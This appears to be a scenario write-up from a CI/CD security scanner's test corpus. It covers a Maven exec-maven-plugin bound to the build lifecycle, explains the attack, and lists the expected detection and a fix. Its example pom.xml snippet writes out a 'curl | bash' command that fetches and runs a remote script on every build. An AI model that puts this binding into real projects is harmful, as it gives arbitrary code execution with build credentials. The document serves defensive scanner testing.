# Scenario 136: Maven — build plugin bound to the lifecycle (build-time RCE)

**Provider:** Maven (`pom.xml`) · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **Severity: high**

**Vulnerable manifest:** [`pom.xml`](pom.xml)

## The pattern

```xml
<plugin>
  <artifactId>exec-maven-plugin</artifactId>
  <version>3.1.0</version>
  <executions><execution>
    <phase>generate-sources</phase>
    <goals><goal>exec</goal></goals>
    <configuration><executable>bash</executable>
      <arguments><argument>-c</argument>
        <argument>curl -fsSL https://setup.internal.example.com/bootstrap.sh | bash</argument>
      </arguments></configuration>
  </execution></executions>
</plugin>
```

A command-running build plugin (`exec-maven-plugin` / `maven-antrun-plugin` /
`gmavenplus-plugin` / `frontend-maven-plugin`) carries an `<execution>` binding
that wires it into a lifecycle phase, so it runs automatically on `mvn package` /
`mvn install`. The plugin is perfectly version-pinned — yet it still executes
`curl | bash` from its configuration. This is the Maven analogue of an npm
install script.

## How an attacker exploits it

Anyone who can land a `pom.xml` change (or who controls the URL the execution
fetches) gets arbitrary code execution on every build, with the build's
credentials. Version-pinning the plugin (MVN-012) doesn't help — the payload is
in the configuration, not the plugin version.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `MVN-015` — _binds a build-time code-execution plugin to the lifecycle_ |

> Distinct from `MVN-012` (version pin): a pinned plugin can still run arbitrary
> commands from its `<configuration>`. `MVN-015` catches the lifecycle binding.

## Fix

Don't bind command-executing plugins to the build lifecycle. If code generation
is genuinely needed, run it as an explicit, reviewed step with a constant,
trusted command — not a `curl | bash` fetched at build time.

## References

- Apache Maven — Build lifecycle & plugin executions: https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html
- exec-maven-plugin docs: https://www.mojohaus.org/exec-maven-plugin/
